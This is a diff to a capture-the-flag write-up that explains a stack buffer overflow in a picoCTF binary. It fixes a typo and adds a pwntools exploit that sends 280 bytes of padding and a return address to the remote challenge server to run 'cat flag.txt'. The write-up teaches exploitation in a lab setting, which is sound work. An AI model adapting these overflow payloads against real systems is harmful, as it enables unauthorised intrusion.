@@ -34,7 +34,7 @@ mov rbp, rsp
 sub rsp, 0x110
 ```
 Here, `rbp` register is pushed onto the stack which saves the value of the base pointer `rbp` . The base pointer `RBP` always points to the base of the stack, and the Stack pointer `RSP` always points to the top of the stack.  
-Then, the current value of `rsp` in moved onto `rbp`, meaning the `rbp` also now points to top of the stack.  
+Then, the current value of `rsp` is moved onto `rbp`, meaning the `rbp` also now points to top of the stack.  
 Finally, `sub rsp, 0x110` allocates `0x110` bytes on the stack to store the local variables.  
 The radare2 command `? 0x110` can be used to print `0x110` in all types, which is equivalent to `272` in decimal.  
 ![7](/7_co.png)  
@@ -87,6 +87,37 @@ Now using same idea, here 264 plus first 8 bytes overwrites `local variable`, an
 Thus, by writing extra `8 bytes` we can fully overwrite `Rbp` and thus can control the return address of the program. Finally, with `280` bytes of input, our program will be pointing to the return address, so that we can overwrite it with any location where we want to jump in the program. For the purpose of this challenge, jumping to the address where `cat flag.txt` is invoked will give us the flag. 
 
 In `disassembled` code above, it can be seen that `cat flag.txt` is being called at location `0x0040077e`. So, providing `280` bytes of input and adding that memory location will overwrite the return address and thus invoke the `cat flag.txt` command and show us the flag.
+
+I used `pwntools` to create an exploit that displays us the flag.   
+  
+```python
+from pwn import *
+
+#Sets remote host and port
+p = remote("mars.picoctf.net", 31890)
+
+#Only one of the payloads below will work at a time
+
+#This overwrites the instruction pointer, jumps to `0x0040077e`, and thus executes `cat flag.txt`
+########## Use This or The Other One ###############
+
+payload = b"A"*280 
+payload += p64(0x0040077e)
+
+####################################################
+
+
+#This overwrites the variable to make it equal to "0xdeadbeef", which prints us the flag
+######### Use This or The Other One ################
+
+#payload = b"A"*264 
+#payload += p64(0xdeadbeef)
+
+####################################################
+p.sendline(payload)
+
+p.interactive()
+```
 
 
 Hope you learned something.  
